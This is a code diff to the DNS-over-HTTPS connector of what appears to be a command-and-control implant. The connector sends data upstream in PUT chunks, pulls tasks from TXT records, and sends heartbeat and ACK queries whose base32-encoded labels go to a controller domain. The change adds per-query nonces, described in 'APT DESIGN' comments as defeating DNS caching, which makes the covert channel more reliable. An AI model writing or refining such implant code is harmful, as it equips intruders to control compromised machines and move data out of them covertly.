@@ -1013,6 +1013,32 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			offset += chunk;
 		}
 		this->lastUpTotal = total;
+		DnsDebugLogf("[DoH] PUT: completed, total=%lu bytes sent", total);
+		
+		// After PUT, send ACK heartbeat with nonce to confirm task was received
+		if (this->downAckOffset > 0) {
+			ULONG ackNonce = GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
+			BYTE ackData[8];
+			ackData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
+			ackData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
+			ackData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
+			ackData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
+			ackData[4] = (BYTE)((ackNonce >> 24) & 0xFF);
+			ackData[5] = (BYTE)((ackNonce >> 16) & 0xFF);
+			ackData[6] = (BYTE)((ackNonce >> 8) & 0xFF);
+			ackData[7] = (BYTE)((ackNonce >> 0) & 0xFF);
+			CHAR ackLabel[24];
+			memset(ackLabel, 0, sizeof(ackLabel));
+			DnsBase32Encode(ackData, 8, ackLabel, sizeof(ackLabel));
+			
+			CHAR ackQname[256];
+			DnsBuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));
+			BYTE tmp[16];
+			ULONG tmpSize = 0;
+			DohQueryA(ackQname, tmp, sizeof(tmp), &tmpSize);
+			DnsDebugLogf("[DoH] PUT: sent ACK ackOffset=%lu nonce=%08x", this->downAckOffset, ackNonce);
+			this->downAckOffset = 0;
+		}
 		return;
 	}
 
@@ -1079,17 +1105,22 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	// ACK mechanism: encode downAckOffset in dataLabel to tell server which offset is confirmed.
 	if (!this->downBuf) {
 		CHAR qnameA[512];
-		// 编码 ACK offset 到 dataLabel：4字节 big-endian base32 编码
-		BYTE ackBytes[4];
-		ackBytes[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
-		ackBytes[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
-		ackBytes[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
-		ackBytes[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
-		CHAR ackLabel[16];
-		memset(ackLabel, 0, sizeof(ackLabel));
-		DnsBase32Encode(ackBytes, 4, ackLabel, sizeof(ackLabel));
-		DnsBuildQName(this->sid, "api", this->seq + 1, this->idx, ackLabel, this->domain, qnameA, sizeof(qnameA));
-		DnsDebugLogf("[DoH] HEARTBEAT(A): seq=%lu ack_offset=%lu", this->seq + 1, this->downAckOffset);
+		// APT: Include ack_offset AND nonce to prevent caching
+		ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
+		BYTE hbData[8];
+		hbData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
+		hbData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
+		hbData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
+		hbData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
+		hbData[4] = (BYTE)((hbNonce >> 24) & 0xFF);
+		hbData[5] = (BYTE)((hbNonce >> 16) & 0xFF);
+		hbData[6] = (BYTE)((hbNonce >> 8) & 0xFF);
+		hbData[7] = (BYTE)((hbNonce >> 0) & 0xFF);
+		CHAR hbLabel[24];
+		memset(hbLabel, 0, sizeof(hbLabel));
+		DnsBase32Encode(hbData, 8, hbLabel, sizeof(hbLabel));
+		DnsBuildQName(this->sid, "hb", this->seq + 1, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
+		DnsDebugLogf("[DoH] HEARTBEAT(A): seq=%lu ack=%lu nonce=%08x", this->seq + 1, this->downAckOffset, hbNonce);
 		BYTE ipBuf[16];
 		ULONG ipSize = 0;
 		if (DohQueryA(qnameA, ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
@@ -1113,19 +1144,25 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		}
 	}
 
-	// NEW DESIGN: Agent controls offset - encode requested offset in QNAME
+	// APT DESIGN: Include offset AND nonce in query to prevent ALL DNS caching
 	ULONG reqOffset = this->downFilled;
-	BYTE reqOffBytes[4];
-	reqOffBytes[0] = (BYTE)((reqOffset >> 24) & 0xFF);
-	reqOffBytes[1] = (BYTE)((reqOffset >> 16) & 0xFF);
-	reqOffBytes[2] = (BYTE)((reqOffset >> 8) & 0xFF);
-	reqOffBytes[3] = (BYTE)((reqOffset >> 0) & 0xFF);
-	CHAR reqOffLabel[16];
-	memset(reqOffLabel, 0, sizeof(reqOffLabel));
-	DnsBase32Encode(reqOffBytes, 4, reqOffLabel, sizeof(reqOffLabel));
+	ULONG nonce = GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);
 	
-	DnsBuildQName(this->sid, "api", ++this->seq, this->idx, reqOffLabel, this->domain, qname, sizeof(qname));
-	DnsDebugLogf("[DoH] GET(TXT): seq=%lu reqOffset=%lu", this->seq, reqOffset);
+	BYTE reqData[8];
+	reqData[0] = (BYTE)((reqOffset >> 24) & 0xFF);
+	reqData[1] = (BYTE)((reqOffset >> 16) & 0xFF);
+	reqData[2] = (BYTE)((reqOffset >> 8) & 0xFF);
+	reqData[3] = (BYTE)((reqOffset >> 0) & 0xFF);
+	reqData[4] = (BYTE)((nonce >> 24) & 0xFF);
+	reqData[5] = (BYTE)((nonce >> 16) & 0xFF);
+	reqData[6] = (BYTE)((nonce >> 8) & 0xFF);
+	reqData[7] = (BYTE)((nonce >> 0) & 0xFF);
+	CHAR reqLabel[24];
+	memset(reqLabel, 0, sizeof(reqLabel));
+	DnsBase32Encode(reqData, 8, reqLabel, sizeof(reqLabel));
+	
+	DnsBuildQName(this->sid, "api", ++this->seq, this->idx, reqLabel, this->domain, qname, sizeof(qname));
+	DnsDebugLogf("[DoH] GET(TXT): seq=%lu reqOffset=%lu nonce=%08x", this->seq, reqOffset, nonce);
 	BYTE respBuf[4096];
 	ULONG respSize = 0;
 	if (DohQueryTxt(qname, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
